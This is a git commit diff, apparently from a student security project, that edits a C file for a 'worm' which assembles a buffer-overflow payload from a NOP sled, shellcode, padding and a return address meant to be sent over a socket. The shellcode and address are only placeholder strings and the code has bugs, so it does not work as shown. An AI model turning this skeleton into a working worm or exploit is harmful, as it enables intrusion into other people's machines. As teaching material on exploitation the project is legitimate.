c555d553e941916df8a63f0098ec7419a30358a6
osboxes.org <drezet@etud.insa-toulouse.fr>
2023-02-22 15:08:35 +0100

    maj_bis

--- worm/injection_shellcode.c
+++ worm/injection_shellcode.c
@@ -19,19 +19,19 @@ char* crafted_payload(){
 	for (int i = 0; i < nb_nop; i++){
 		nops[i] = *un_nop;
 	}
-	printf("%s\n", nops);
+	//printf("%s\n", nops);
 
 	// Shellcode en dur
 	char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
-	printf("%s\n", shellcode);
+	//printf("%s\n", shellcode);
 
 	// Padding de bp
 	char padding_bp [] = "\x41\x41\x41\x41";
-	printf("%s\n", padding_bp);
+	//printf("%s\n", padding_bp);
 
 	// Adresse de retour en dur
 	char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
-	printf("%s\n", retour);
+	//printf("%s\n", retour);
 
 	char final_buf[sizeof(nops) + sizeof(shellcode) + sizeof(padding_bp) + sizeof(retour)];
 
@@ -39,16 +39,17 @@ char* crafted_payload(){
 	strcat(final_buf, shellcode);
 	strcat(final_buf, padding_bp);
 	strcat(final_buf, retour);
-	printf("%s\n", final_buf);
+	//printf("%s\n", final_buf);
 
 	pay_size = sizeof(final_buf);
-	printf("%zu\n", pay_size);
+	//printf("%zu\n", pay_size);
 
 	char * pay = malloc(pay_size * sizeof(char));
-	printf("%zu\n", sizeof(pay));
-	pay = nops;
+	//printf("%zu\n", sizeof(pay));
+	pay = final_buf;
+	printf("%s\n", pay);
 
-	return final_buf;
+	return pay;
 }
 
 int func(int sockfd, char *pay)
@@ -75,9 +76,12 @@ int main (int argc, char *argv[]){
 
 	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
 
+	//crafted_payload();
+	//printf("%li\n", pay_size);
 	char payload[pay_size];
-	memset(payload, atoi(crafted_payload()), pay_size);
-	// sprintf ?
+	//printf("%li\n", sizeof(payload));
+	//memset(payload, crafted_payload(), pay_size);
+	//snprintf(payload, pay_size, crafted_payload());
 	
     // Ecriture en dur du shellcode : 
     // NOP *40(etc 1 octet chaque)
